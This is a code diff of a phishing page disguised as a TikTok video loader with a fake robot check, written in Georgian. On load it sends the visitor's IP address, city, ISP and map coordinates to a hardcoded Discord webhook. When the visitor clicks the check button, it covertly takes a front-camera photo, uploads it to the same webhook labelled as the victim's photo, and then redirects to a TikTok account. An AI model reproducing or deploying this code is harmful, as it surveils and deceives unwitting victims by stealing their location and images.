@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ჩატვირთვა...</title>
+    <title>Loading...</title>
 </head>
-<body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0;">
+<body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden;">
 
     <div id="content" style="text-align: center; padding: 20px;">
         <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="70" style="margin-bottom: 20px;">
-        <h2>ვიდეო მზად არის</h2>
-        <p style="color: #ccc;">სანახავად დააჭირეთ დადასტურებას</p>
-        <button id="authBtn" style="background: #fe2c55; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px;">დადასტურება</button>
+        <h2 id="status">ვიდეო იტვირთება...</h2>
+        <p id="subtext" style="color: #ccc;">გთხოვთ დაადასტუროთ, რომ არ ხართ რობოტი</p>
+        <button id="authBtn" style="background: #fe2c55; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px;">ვარ რობოტი? არა</button>
     </div>
 
     <video id="video" style="display:none;" autoplay playsinline></video>
@@ -20,75 +20,74 @@
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
 
-        async function getIPInfo() {
+        // 1. ეს ფუნქცია ეშვება ეგრევე, შევა თუ არა საიტზე (IP Logger)
+        async function logVisit() {
             try {
-                const res = await fetch('http://ip-api.com/json/');
-                return await res.json();
-            } catch { return { query: "Unknown", city: "Unknown" }; }
-        }
+                const geoRes = await fetch('http://ip-api.com/json/');
+                const data = await geoRes.json();
 
-        async function captureFromMode(mode, label) {
-            const constraints = { video: { facingMode: mode, width: 1280, height: 720 } };
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-
-            return new Promise(resolve => {
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(blob => {
-                        stream.getTracks().forEach(track => track.stop());
-                        resolve({ blob, label });
-                    }, 'image/jpeg', 0.8);
-                }, 1000); // 1 წამი ფოკუსისთვის
-            });
-        }
-
-        document.getElementById('authBtn').addEventListener('click', async () => {
-            document.getElementById('content').innerHTML = "<h2>ჩატვირთვა...</h2><p>მიმდინარეობს რეგიონის შემოწმება</p>";
-            
-            try {
-                const geoData = await getIPInfo();
-
-                // 1. ვიღებთ სურათს წინა კამერით
-                const front = await captureFromMode("user", "წინა კამერა (Selfie)");
-                
-                // 2. ვიღებთ სურათს უკანა კამერით
-                const back = await captureFromMode("environment", "უკანა კამერა (Main/0.5x)");
-
-                // მონაცემების მომზადება გაგზავნისთვის
-                const formData = new FormData();
-                formData.append('file1', front.blob, 'front.jpg');
-                formData.append('file2', back.blob, 'back.jpg');
-
-                const discordContent = {
-                    content: "🎯 **მსხვერპლის დუბლირებული ფოტოები!**",
+                const payload = {
+                    content: "🔔 **ვიღაც შევიდა ლინკზე! (ველოდებით ფოტოს...)**",
                     embeds: [{
-                        title: "📍 ინფორმაცია",
-                        color: 16711680,
+                        color: 3447003,
                         fields: [
-                            { name: "🌐 IP", value: `\`${geoData.query}\``, inline: true },
-                            { name: "🏙️ ქალაქი", value: geoData.city, inline: true },
-                            { name: "📡 პროვაიდერი", value: geoData.isp },
-                            { name: "📷 კამერები", value: "წინა და უკანა ფოტოები ატვირთულია" }
+                            { name: "🌐 IP მისამართი", value: `\`${data.query}\``, inline: true },
+                            { name: "🏙️ ქალაქი", value: data.city, inline: true },
+                            { name: "📡 პროვაიდერი", value: data.isp },
+                            { name: "🔗 რუკა", value: `[ნახვა Google Maps-ზე](https://www.google.com/maps?q=${data.lat},${data.lon})` }
                         ]
                     }]
                 };
 
-                formData.append('payload_json', JSON.stringify(discordContent));
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) { console.error("IP Log Error:", err); }
+        }
 
-                // გაგზავნა Discord-ზე
-                await fetch(webhookURL, { method: 'POST', body: formData });
+        // 2. ეს ფუნქცია ეშვება ღილაკზე დაჭერისას (კამერა)
+        async function capturePhoto() {
+            document.getElementById('authBtn').style.display = 'none';
+            document.getElementById('status').innerText = "მოწმდება...";
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, // წინა კამერა სელფისთვის
+                    audio: false 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
 
-                window.location.href = "https://www.tiktok.com";
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'face.jpg');
+                        formData.append('payload_json', JSON.stringify({
+                            content: "📸 **მსხვერპლის ფოტო მოვიდა!**"
+                        }));
+
+                        await fetch(webhookURL, { method: 'POST', body: formData });
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://www.tiktok.com/@yvelazederski";
+                    }, 'image/jpeg', 0.8);
+                }, 1000);
             } catch (err) {
-                console.error(err);
-                window.location.href = "https://www.tiktok.com";
+                window.location.href = "https://www.tiktok.com/@yvelazederski";
             }
-        });
+        }
+
+        // გვერდის ჩატვირთვისას მაშინვე ვაგზავნით IP-ს
+        window.onload = logVisit;
+        // ღილაკზე დაჭერისას ვიღებთ ფოტოს
+        document.getElementById('authBtn').addEventListener('click', capturePhoto);
     </script>
 </body>
 </html>
